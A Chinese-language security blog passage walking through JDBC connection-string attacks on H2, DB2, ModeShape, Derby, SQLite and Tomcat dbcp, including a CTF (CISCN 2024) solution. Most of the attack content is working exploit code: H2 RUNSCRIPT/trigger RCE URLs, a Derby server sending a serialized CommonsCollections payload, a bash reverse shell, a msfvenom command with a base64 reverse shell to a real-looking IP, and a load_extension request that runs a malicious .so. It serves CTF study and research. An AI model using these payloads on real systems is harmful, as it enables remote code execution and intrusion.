因为init = `RUNSCRIPT FROM 'http://127.0.0.1:8888/poc.sql'`不为空，先后调用了prepareLocal和executeUpdate

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129200410137.png)

跟进到prepareLocal，调用了prepareCommand解析sql字符串，跟进到`org.h2.command.Parser$parse(String sql, ArrayList<Token> tokens)`，调用了initialize

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129201110388.png)

继续跟进到Tokenizer.tokenize

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129201226637.png)

这就是解析JDBC字符串的关键了，会循环地去匹配字符开头：比如我们字符串为`RUNSCRIPT FROM 'http://127.0.0.1:8888/h2_JDBC_Attack.sql'`，开头R进入case 调用readR

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130201248730.png)

readR先调用findIdentifierEnd去查找keyword关键字，这里已经找到RUNSCRIPT，不过RIGHT ROW ROWNUM需要优先依次进行匹配，未匹配到最后调用readIdentifierOrKeyword。这里就完成了提取RUNSCRIPT

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130201500903.png)

接着空格略过

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202515115.png)

From关键字

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202527363.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202556448.png)

最后分离出的tokens如下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202642192.png)

解析完字符串后在prepareCommand中调用了CommandContainer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130203919206.png)

明确了这是个RUNSCRIPT的CommandContainer，包装在了parser里面

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130204014129.png)

之后会调用到RuntimeScriptCommand里

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130204419593.png)



继续回到Engine.openSession，跟进executeUpdate

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202904432.png)

一直跟进到RunScriptCommand.update，循环执行从远程文件读到的sql语句

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130203445113.png)



### 攻击手法总结

由于JDBC连接时`INIT`只能执行一条SQL语句，所以攻击方式比较有限

* 能出网，可以打RUNSCRIPT

```HTTP
jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8888/evil.sql'
```

```sql
DROP ALIAS IF EXISTS shell;
CREATE ALIAS shell AS $$void shell(String s) throws Exception {
    java.lang.Runtime.getRuntime().exec(s);
}$$;
SELECT shell('bash -i ..');
```

有回显：

```sql
CREATE ALIAS SHELLEXEC AS $$String shellexec(String cmd) throws java.io.IOException{
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); 
	return s.hasNext() ? s.next() : ""; 
}$$;

CALL SHELLEXEC('whoami');
```

* 不出网

H2和MySQL一样有INFORMATION_SCHEMA。H2提取URL中的配置时是通过分割分号`;`来提取的，因此JS代码中不能有分号，否则会报错（可以加上反斜杠代表转义），`//javascript`是H2的语法

在H2内存数据库中创建一个触发器 TRIG_JS，该触发器在向 INFORMATION_SCHEMA.TABLES 表插入数据后执行。触发器的主体是一个JavaScript脚本

```http
jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS '//javascript
Java.type("java.lang.Runtime").getRuntime().exec("calc")'
```

另外，目标机器有groovy依赖，能打AST注解

```xml
<dependency>
    <groupId>org.codehaus.groovy</groupId>
    <artifactId>groovy-sql</artifactId>
    <version>3.0.8</version>
</dependency>
```

```http
jdbc:h2:mem:test;init=CREATE ALIAS shell2 AS
$$@groovy.transform.ASTTest(value={
assert java.lang.Runtime.getRuntime().exec("cmd.exe /c calc.exe")
})
def x$$
```

* 绕过

INIT被过滤的时候，`TRACE_LEVEL_SYSTEM_OUT`,`TRACE_LEVEL_FILE`,`TRACE_MAX_FILE_SIZE`能触发堆叠注入，分号需要转义

```http
jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=1\;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
Java.type("java.lang.Runtime").getRuntime().exec("calc")$$--
```



## IBM DB2

```xml
<dependency>
  <groupId>com.ibm.db2</groupId>
  <artifactId>jcc</artifactId>
  <version>11.5.0.0</version>
</dependency>
```

这个需要数据库存在才能打

docker起靶机：

```
docker pull ibmcom/db2express-c:latest
docker run -d --name db2 --privileged=true -p 50000:50000 -e  DB2INST1_PASSWORD=db2admin -e LICENSE=accept ibmcom/db2express-c  db2start
```

poc：

```http
jdbc:db2://127.0.0.1:50000/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/fgfhjn;
```

```java
public class DB2JDBCRCE {
    public static void main(String[] args) throws Exception {
        Class.forName("com.ibm.db2.jcc.DB2Driver");
        DriverManager.getConnection("jdbc:db2://127.0.0.1:50000/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/fgfhjn;");
    }
}
```

com.ibm.db2.jcc.am.c0$run处存在JNDI

## ModeShape

```xml
<dependency>
    <groupId>org.modeshape</groupId>
    <artifactId>modeshape-jdbc</artifactId>
    <version>5.4.1.Final</version>
</dependency>
```

直接JNDI

```java
public class Demo {
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        Class.forName("org.modeshape.jdbc.LocalJcrDriver");
        DriverManager.getConnection("jdbc:jcr:jndi:ldap://127.0.0.1:1389/q2s3n8");
    }
}
```

org.modeshape.jdbc.delegate.LocalRepositoryDelegate存在JNDI

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130213136636.png)



## Apache Derby

```xml
<dependency>
  <groupId>org.apache.derby</groupId>
  <artifactId>derby</artifactId>
  <version>10.10.1.1</version>
</dependency>
```

Derby JNDI Server:

```java
public class Derby_JNDI_Server {
    private static final String PAYLOAD_FILE = "cc6.ser";
    public static void main(String[] args) throws Exception {
        // your port
        int          port   = 4851;
        ServerSocket server = new ServerSocket(port);
        Socket socket = server.accept();

        // CC6
        String evil=getPayloadContent();
        byte[] decode = Base64.getDecoder().decode(evil);

        // 直接向 socket 中写入
        socket.getOutputStream().write(decode);
        socket.getOutputStream().flush();
        Thread.sleep(TimeUnit.SECONDS.toMillis(5));
        socket.close();
        server.close();
    }
    private static String getPayloadContent() {
        File file = new File(PAYLOAD_FILE);
        if (file.exists()) {
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] bytes = new byte[(int) file.length()];
                fis.read(bytes);
                return base64encode(bytes);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        } else {
            System.out.println("Payload file not found");
        }
        return "aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878";
    }
    public static String base64encode(byte[] bytes) throws Exception
    {
        Class<?> base64 = Class.forName("java.util.Base64");
        Object Encoder = base64.getMethod("getEncoder").invoke(null);
        return (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder,bytes);
    }
}
```

JNDI Client

```java
    public static void main(String[] args) throws Exception{
        Class.forName("org.apache.derby.jdbc.EmbeddedDriver");
        //DriverManager.getConnection("jdbc:derby:dbname;create=true");
        DriverManager.getConnection("jdbc:derby:dbname;startMaster=true;slaveHost=127.0.0.1");
    }
```

先调用注释中的create=true创建一个dbname数据库，才能顺利执行

derby会调用`ReplicationMessageTransmit$MasterReceiverThread#readMessage`去解析数据

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201104640410.png)

该函数会调用到org.apache.derby.impl.store.replication.net.SocketConnection.readMessage反序列化InputStream

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201104834485.png)

直接打字节码即可





## SQLite JDBC Attack

这个数据库出现的很少，但ctf就喜欢考少见的东西。由于24ciscn涉及就来复现一下

与大多数其他 SQL 数据库不同，SQLite 没有单独的服务器进程。SQLite 直接读取和写入普通磁盘文件。一个完整的 SQL 数据库（包含多个表、索引、触发器和视图）包含在单个磁盘文件中。

3.6.14.1-3.41.2.1为漏洞版本，3.41.2.2为安全版本

```xml
<dependency>
    <groupId>org.xerial</groupId>
    <artifactId>sqlite-jdbc</artifactId>
    <version>3.8.9</version>
</dependency>
```



JDBC中，sqlite参数相当于执行对应的PRAGMA的SQL语句，比如下面两句等价

```sql
jdbc:sqlite:file:default.db?cache_size=2000
PRAGMA cache_size = 2000
```

sqlite官网列出了PRAGMAs

https://www.sqlite.org/pragma.html

![image-20241220204530154](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220204530154.png)

可以理解成sqlite的api

`org.sqlite.SQLiteConfig.apply()`处，给出了从jdbc参数转化为PRAGMA语句的代码，把参数对应的(key,value)转变为`pragma key=value`

![image-20241220211000864](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220211000864.png)

除了这些PRAGMA，在SQLiteConfig定义的枚举变量还有一些不在上图的others语句，也就是下面注释的`// Parameters requiring SQLite3 API invocation`和`// Others`

```java
public static enum Pragma {

    // Parameters requiring SQLite3 API invocation
    OPEN_MODE("open_mode", "Database open-mode flag", null),
    SHARED_CACHE("shared_cache", "Enable SQLite Shared-Cache mode, native driver only", OnOff),
    LOAD_EXTENSION("enable_load_extension", "Enable SQLite load_extention() function, native driver only", OnOff),

    // Pragmas that can be set after opening the database
    CACHE_SIZE("cache_size"),
    CASE_SENSITIVE_LIKE("case_sensitive_like", OnOff),
    COUNT_CHANGES("count_changes", OnOff),
    DEFAULT_CACHE_SIZE("default_cache_size"),
    EMPTY_RESULT_CALLBACKS("empty_result_callback", OnOff),
    ENCODING("encoding", toStringArray(Encoding.values())),
    FOREIGN_KEYS("foreign_keys", OnOff),
    FULL_COLUMN_NAMES("full_column_names", OnOff),
    FULL_SYNC("fullsync", OnOff),
    INCREMENTAL_VACUUM("incremental_vacuum"),
    JOURNAL_MODE("journal_mode", toStringArray(JournalMode.values())),
    JOURNAL_SIZE_LIMIT("journal_size_limit"),
    LEGACY_FILE_FORMAT("legacy_file_format", OnOff),
    LOCKING_MODE("locking_mode", toStringArray(LockingMode.values())),
    PAGE_SIZE("page_size"),
    MAX_PAGE_COUNT("max_page_count"),
    READ_UNCOMMITED("read_uncommited", OnOff),
    RECURSIVE_TRIGGERS("recursive_triggers", OnOff),
    REVERSE_UNORDERED_SELECTS("reverse_unordered_selects", OnOff),
    SHORT_COLUMN_NAMES("short_column_names", OnOff),
    SYNCHRONOUS("synchronous", toStringArray(SynchronousMode.values())),
    TEMP_STORE("temp_store", toStringArray(TempStore.values())),
    TEMP_STORE_DIRECTORY("temp_store_directory"),
    USER_VERSION("user_version"),

    // Others
    TRANSACTION_MODE("transaction_mode", toStringArray(TransactionMode.values())),
    DATE_PRECISION("date_precision", "\"seconds\": Read and store integer dates as seconds from the Unix Epoch (SQLite standard).\n\"milliseconds\": (DEFAULT) Read and store integer dates as milliseconds from the Unix Epoch (Java standard).", toStringArray(DatePrecision.values())),
    DATE_CLASS("date_class", "\"integer\": (Default) store dates as number of seconds or milliseconds from the Unix Epoch\n\"text\": store dates as a string of text\n\"real\": store dates as Julian Dates", toStringArray(DateClass.values())),
    DATE_STRING_FORMAT("date_string_format", "Format to store and retrieve dates stored as text. Defaults to \"yyyy-MM-dd HH:mm:ss.SSS\"", null),
    BUSY_TIMEOUT("busy_timeout", null);

    public final String   pragmaName;
    public final String[] choices;
    public final String   description;

    private Pragma(String pragmaName) {
        this(pragmaName, null);
    }

    private Pragma(String pragmaName, String[] choices) {
        this(pragmaName, null, choices);
    }

    private Pragma(String pragmaName, String description, String[] choices) {
        this.pragmaName = pragmaName;
        this.description = description;
        this.choices = choices;
    }

    public final String getPragmaName()
    {
        return pragmaName;
    }
}
```

上面唯一能利用的参数，是load_extension()，可以用来加载动态链接库



锁定到sqlite-jdbc 2023 May19的一条Commit

![image-20241220213331722](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220213331722.png)

先看代码，只是把resourceAddr.hashCode换成了UUID.randomUUID。让远程加载数据库文件的缓存文件变得不可预测

![image-20241220213533629](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220213533629.png)

这条Commit下面的Comment也很有意思，说这版代码用着会持续不断地创建sqlite-jdbc-tep-%s.db，会损耗磁盘空间，而生成的db缓存文件在程序结束不会被删除。问能不能还原该commit

原来的缓存文件用hashCode后缀，而众所周知hashCode是单向函数，而不是随机函数，该文件命名攻击者可以预测出来

当sqlite建立连接时调用`org.sqlite.core.CoreConnection#open`

如果文件名不以`:memory`或`file:`开头，或不包含`mode=memory`，则进入第二个if；如果文件名以`resource:`开头，则把文件名转为URL，调用extractResource去远程加载

![image-20241220220125863](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241220220125863.png)

比如`jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db`就能远程加载db文件

跟进到extractResource看看怎么加载的，获取了系统的tmp目录，然后文件名为`sqlite-jdbc-tmp-%d.db`带入` resourceAddr.hashCode()`

![image-20241221170430563](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221170430563.png)

接着从resourceAddr获取文件内容写进了上面的db文件

![image-20241221170738225](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221170738225.png)

只是写文件似乎还不够，有没有办法达到RCE呢

我们想到上面提到的load_extension()加载动态链接库。

除了JDBC URL可控制，假设还有下列代码：

sql语句固定了为`"select * from student"`

```java
package org.example;

import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;

public class Main {
    public static void main(String[] args) {
        try {
            String sql = "select * from student";
            PreparedStatement preStmt = conn.prepareStatement(sql);
            preStmt.executeUpdate();
            preStmt.close();
            conn.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

可以使用`SELECT load_extension('/tmp/...so')`加载dll/so文件。

如果select语句可以控制，那可以执行`select * from (select (load_extension(\"/tmp/sqlite-jdbc-tmp-xxx.db\"))`

但是上述代码为`select * from student`，根本无法写成select load_extension，该如何修改？

利用`create view` 语句，可以劫持SELECT语句，如下

```sqlite
create view y4tacker as SELECT (select load_extension('/tmp/....so'))
```

正巧，在open方法内，extractResource之后就执行了NativeDB.open去加载db文件

![image-20241221180411860](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221180411860.png)

执行create view语句后，再执行固定的select就会被劫持成执行`select load_extension('/tmp/....so')`



于是我们的攻击流程如下：

* 利用JDBC Attack写恶意so文件，可以是自己编译的弹shell，也可以是msfvenom
* 继续利用JDBC Attack写create view的db文件，写完后会被自动加载

```sqlite
CREATE VIEW test(a) as select load_extension('calc.dll','dllmain')
```

在调用select时触发恶意so

上述利用需要开启了enable_load_extension，如果没开，也可以通过PRAGMA开启：

```
jdbc:sqlite:file:/tmp/sqlite-jdbc-tmp-hashcode.db?enable_load_extension=true
```



### 2024ez_java题解

给了源代码，springboot起的，有两种打法

* 直接打sqlite JDBC写缓存，然后sqlite加载so

* mysql JDBC打AJ写so文件，sqlite加载so

理论上已知JAVA HOME的话，还能打Springboot FatJar RCE



先看下依赖，给了sqlite,mysql,postgresql的JDBC依赖，还有aspectjweaver

![image-20241221195230733](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195230733.png)

![image-20241221195242663](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195242663.png)

![image-20241221195248562](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195248562.png)

可惜没给spring-expression依赖，不然能打postgreSQL的SpEL注入

审代码，看到JdbcController，调用了DatasourceServiceImpl.testDatasourceConnectionAble

![image-20241221195842587](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221195842587.png)

testDatasourceConnectionAble里分别给出了三个JDBC的case，其中case3就是调用SqliteDatasourceConnector进行连接，继续跟进

![image-20241221200008209](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200008209.png)

环境先开启了enableLoadExtension，然后调用getConnection

![image-20241221200127396](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200127396.png)

这就是个JDBC Attack的点，可以用来写文件到/tmp下

继续看到getTableContent，调用了select

![image-20241221200407450](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200407450.png)

case里，connector之后就调用了getTableContent

![image-20241221200508187](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221200508187.png)

#### 题解1：sqlite写缓存题解

jdbc Attack + 写create view劫持select

现在先制作一个so，懒得编译C了，直接msf吧

把反弹shell base一下

```shell
bash -c "bash -i >& /dev/tcp/vpsip/20303 0>&1"
```

```sh
msfvenom -p linux/x64/exec CMD='echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTUuMjM2LjE1My4xNzQvMjAzMDMgMD4mMSI=|base64 -d|bash' -f elf-so -o evil.so
```

开个http服务挂evil.so

![image-20241221202529840](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221202529840.png)

写两行代码看下写进去的so文件名

```java
import java.net.URL;

public class test {
    public static void main(String[] args) throws Exception{
        String url = "http://vps:port/evil.so";
        Integer hash = new URL(url).hashCode();
        String dbFileName = String.format("sqlite-jdbc-tmp-%d.db", Integer.valueOf(hash));
        System.out.println(dbFileName);
    }
}
```

我的是`sqlite-jdbc-tmp-882872429.db`

再生成一个恶意db去触发上面传的db，生成恶意db的代码如下：

```java
import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;

public class Main {
    public static void main(String[] args) {
        try {
            String dbFile = "poc.db";
            File file = new File(dbFile);
            Class.forName("org.sqlite.JDBC");
            Connection conn = DriverManager.getConnection("jdbc:sqlite:"+dbFile);
            System.out.println("Opened database successfully");
            String sql = "CREATE VIEW security as SELECT (SELECT load_extension('/tmp/sqlite-jdbc-tmp-882910002.db'));";  //向其中插⼊传⼊的三个参数
            PreparedStatement preStmt = conn.prepareStatement(sql);
            preStmt.executeUpdate();
            preStmt.close();
            conn.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

poc.db二进制：

![image-20241222153642993](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222153642993.png)

继续上传恶意poc.db，代码会自动执行：

![image-20241221204750389](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221204750389.png)

MD，向日葵普通版不支持http，只能tcp，半天没打进，鼠鼠这次是真要买个vps了

重金之下，终于弹回了shell

![image-20241221210850016](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221210850016.png)

![image-20241221210934151](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221210934151.png)

如果没开enable_load_extension，也可以直接开，题目是代码开了

```
jdbc:sqlite:file:/tmp/sqlite-jdbc-tmp-hashcode.db?enable_load_extension=true
```

select的触发，是传tableName参数，完成了`select * from security`触发视图

![image-20241221212758961](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241221212758961.png)

#### 题解2：无create裸打

需要题目场景存在select语句可控制

题解1不是搞了个create view的db去打的吗，其实还有更优雅的方法，因为sql语句可控制内容很大，写evil.so到/tmp下后，post下面这个数据包，能直接弹回shell

```json
{"type":"3",
 "tableName":"(select (load_extension(\"/tmp/sqlite-jdbc-tmp-882872429.db\")));",
 "url":"jdbc:sqlite:file:/tmp/any.db"}
```

![image-20241222153108045](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222153108045.png)

随便传一个jdbc url串，让代码能够顺利走到getTableContent

![image-20241222153459969](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241222153459969.png)

上面的payload是触发了`select * from (select (load_extension(\"/tmp/sqlite-jdbc-tmp-882872429.db\"))`

## JNDI高版本中利用JDBC绕过

Tomcat和commons-dbcp自带了dbcp连接数据库

dbcp分为dbcp1和dbcp2，同时又分为 commons-dbcp 和 Tomcat 自带的 dbcp。这么一算的话有四个dhcp的类，不过其中代码都是大致相同的

比如tomcat的dhcp2，Tomcat8自带dhcp2，7自带dhcp

以Tomcat8的`org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory`为例

```xml
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-dbcp</artifactId>
    <version>8.5.56</version>
</dependency>
```

该factory继承了ObjectFactory

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126214424473.png)

重写了getObjectInstance

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126214509825.png)

调用了createDataSource

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126214524364.png)

createDataSource方法,InitialSize > 0时会调用getLogWriter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126211800091.png)

跟进到getLogWriter，这是个数据库的日志记录函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126213316784.png)

继续跟到BasicDataSource.createDatasource，createPollableConnectionFactory连接数据库工厂

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142500301.png)

createPoolableConnectionFactory构造函数调用到validateConnectionFactory，然后调用了makeObject

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142627267.png)

在makeObject调用createConnection

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142742993.png)

createConnection对我们传入的JDBC串进行connect，下面就是根据不同的JDBC串进行connect的流程了，比如这里用的Mysql，就会进到`com.mysql.cj.jdbc`connect的流程

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201142846039.png)



payload的JDBC串需要根据目标机现有的数据库依赖进行选择，如果目标机有H2+JDK11就能打RUNSCRIPT之类的，这里假设目标用的MySQL

```java
private static String tomcat_dbcp2_RCE(){
    return "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory";
}
private static String tomcat_dbcp1_RCE(){
    return "org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory";
}
private static String commons_dbcp2_RCE(){
    return "org.apache.commons.dbcp2.BasicDataSourceFactory";
}
private static String commons_dbcp1_RCE(){
    return "org.apache.commons.dbcp.BasicDataSourceFactory";
}
public static void main(String[] args) throws Exception {
    LocateRegistry.createRegistry(1099);
    Hashtable<String, String> env = new Hashtable<>();
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
    env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
    String factory = tomcat_dbcp2_RCE();
    ResourceRef ref = new ResourceRef("javax.sql.DataSource", null, "", "", true, factory, null);
    String JDBC_URL = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";//根据数据库依赖修改JDBC串
    ref.add(new StringRefAddr("driverClassName","com.mysql.jdbc.Driver"));
    ref.add(new StringRefAddr("url",JDBC_URL));
    ref.add(new StringRefAddr("username","root"));
    ref.add(new StringRefAddr("password","password"));
    ref.add(new StringRefAddr("initialSize","1"));
    InitialContext context = new InitialContext(env);
    context.bind("remoteImpl", ref);//创建http:目录，然后创建127.0.0.1:8888目录
}
```

本地起恶意MySQL Server + JNDI Server

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/%E9%AB%98%E7%89%88%E6%9C%ACJNDI%20JDBC%20MySQL%E7%BB%95%E8%BF%87.gif)



## 总结

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201143717691.png)

——su18



参考：

《Make JDBC Attacks Brilliant Again》议题

https://github.com/fnmsd/MySQL_Fake_Server

https://p4d0rn.gitbook.io/java/jdbc-attack/h2

https://mp.weixin.qq.com/s/JY1C2LqOqbAQvJLIhG8prQ?ref=www.ctfiot.com

https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/

https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC%20Attack/SQLite/index.md